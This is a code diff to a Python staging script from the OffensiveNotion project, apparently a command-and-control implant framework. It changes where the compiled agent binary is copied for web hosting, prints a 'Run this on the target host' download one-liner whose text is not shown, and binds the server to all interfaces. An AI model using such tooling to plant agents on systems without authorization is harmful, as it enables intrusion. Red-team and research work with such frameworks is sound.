@@ -20,26 +20,14 @@ def randomize_str() -> str:
 
 
 def copy_agent(os, build, uri):
-    web_dir = "utils/www/{}".format(uri)
+    web_dir = "/OffensiveNotion/utils/www/{}".format(uri)
     print(info + "Copying agent")
     if os == "windows":
-        agent_path = "x86_64-pc-windows-gnu"
-        bin_dir_folder = "windows_" + build
         agent_name = "offensive_notion.exe"
-    elif os == "linux":
-        agent_path = build
-        bin_dir_folder = "linux_" + build
-        agent_name = "offensive_notion"
     else:
-        agent_path = "debug"
-        bin_dir_folder = "linux_debug"
         agent_name = "offensive_notion"
-
     try:
-        if os == "windows":
-            shutil.move("bin/{}/{}/{}/{}".format(bin_dir_folder, agent_path, build, agent_name), web_dir)
-        else:
-            shutil.move("bin/{}/{}/{}".format(bin_dir_folder, agent_path, agent_name), web_dir)
+        shutil.move("/out/{}".format(agent_name), web_dir)
     except Exception as e:
         print(printError + str(e))
         exit(1)
@@ -96,5 +84,5 @@ def main(host, port, method, os, build):
     uri = randomize_str()
     copy_agent(os, build, uri)
     one_liner = generate_payload(method, host, port, uri)
-    print("\n" + important + "Run this on the target host:\n"  + Fore.YELLOW + one_liner + Fore.RESET + "\n")
-    app.run(host=host, port=port)
+    print("\n" + important + "Run this on the target host:\n" + Fore.YELLOW + one_liner + Fore.RESET + "\n")
+    app.run(host="0.0.0.0", port=port)
